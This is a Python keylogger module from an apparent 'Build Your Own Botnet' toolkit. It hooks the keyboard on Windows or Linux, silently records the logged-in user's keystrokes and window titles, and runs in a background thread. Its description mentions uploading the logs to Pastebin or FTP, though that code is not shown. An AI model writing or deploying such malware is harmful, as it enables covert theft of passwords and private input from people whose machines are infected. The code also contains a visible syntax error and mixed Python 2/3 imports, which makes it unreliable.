#!/usr/bin/python
# -*- coding: utf-8 -*-
'Keylogger (Build Your Own Botnet)'

# standard library
import os
import sys
import time
import Queue
import urllib
import StringIO
import threading
import collections

try:
    from io import StringIO        # Python 3
except ImportError:
    from StringIO import StringIO  # Python 2

# packages
if sys.platform == 'win32':
    import pyHook as hook_manager
    import pythoncom
else:
    import pyxhook as hook_manager

# utilities
from . import util

# globals
abort = False
command = True
packages = ['util','pyHook','pythoncom'] if os.name == 'nt' else ['util','pyxhook']
platforms = ['win32','linux2','darwin']
window = None
max_size = 4000
logs = StringIO()
threads = {}
results = {}
usage = 'keylogger <run/status/stop>'
description = """
Log the keystrokes of the currently logged-in user on the 
client host machine and optionally upload them to Pastebin
or an FTP server 
"""

# main
def _event(event):
    global window
    try:
        if event.WindowName != window]:
            window = event.WindowName
            logs.write("\n[{}]\n".format(window))
        if event.Ascii > 32 and event.Ascii < 127:
            logs.write(chr(event.Ascii))
        elif event.Ascii == 32:
            logs.write(' ')
        elif event.Ascii in (10,13):
            logs.write('\n')
        elif event.Ascii == 8:
            logs.seek(-1, 1)
            logs.truncate()
        else:
            pass
    except Exception as e:
        util.log('{} error: {}'.format(event.func_name, str(e)))
    return True

def _run():
    while True:
        hm = hook_manager.HookManager()
        hm.KeyDown = _event
        hm.HookKeyboard()
        pythoncom.PumpMessages() if os.name == 'nt' else time.sleep(0.1)
        if abort: 
            break

def run():
    """ 
    Run the keylogger

    """
    global threads
    try:
        if 'keylogger' not in threads or not threads['keylogger'].is_alive():
            threads['keylogger'] = threading.Thread(target=_run, name=time.time())
        return threads['keylogger']
    except Exception as e:
        util.log(str(e))
